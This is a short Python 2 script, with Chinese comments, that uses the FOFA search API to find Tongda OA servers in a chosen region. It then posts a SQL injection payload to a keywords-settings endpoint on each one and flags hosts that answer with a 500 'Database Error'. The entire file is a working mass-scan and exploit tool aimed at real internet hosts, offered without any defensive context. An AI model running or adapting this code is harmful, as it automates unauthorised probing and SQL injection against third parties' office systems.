#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests as req
import urlparse
import base64
import json
import re


def get_ip():

    querystr = "\"通达\" && region=\"xxxx\""   #fofa语法
    enquerystr = (base64.b64encode(querystr)).decode("utf-8")
    print(enquerystr)
    url = "https://fofa.so/api/v1/search/all?email=xxx@xxx.com&key=xxx&qbase64="+enquerystr+"&size=100"  #fofa key
    resp = req.get(url)
    json_dict = json.loads(resp.text)

    list1 = []

    for results in json_dict["results"]: #根据返回的json数据获取results
        result = json.dumps(results)        #去掉u字符，字典数据转成字符串
        res = re.findall(r"\[\"(.+?)\"\,", result)
        list1.append("http://"+res[0])

    for lis in list1:
        resu = vul_exp(lis)
        if resu[0] == True:
            print resu
        else:
            pass

def vul_exp(url):
    header = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    key = ['Database Error']
    path = '/general/document/index.php/setting/keywords/index'
    payload = "_SERVER[QUERY_STRING]=kname=1' and@`'` or if((1 and (1 *)),1,exp(710))#"
    flag = False
    parse = urlparse.urlparse(url)
    scheme = parse.scheme
    host = parse.hostname
    port = parse.port
    target = '{0}://{1}:{2}{3}'.format(scheme, host, port, path)

    try:
        res = req.post(target, data=payload, headers=header, timeout=7)
        content = res.content
        code = res.status_code
        if (key[0] in content) and code==500:
            flag = True
            return flag, payload, target
    except:
        pass
    return flag, payload, target

if __name__ == "__main__":
    get_ip()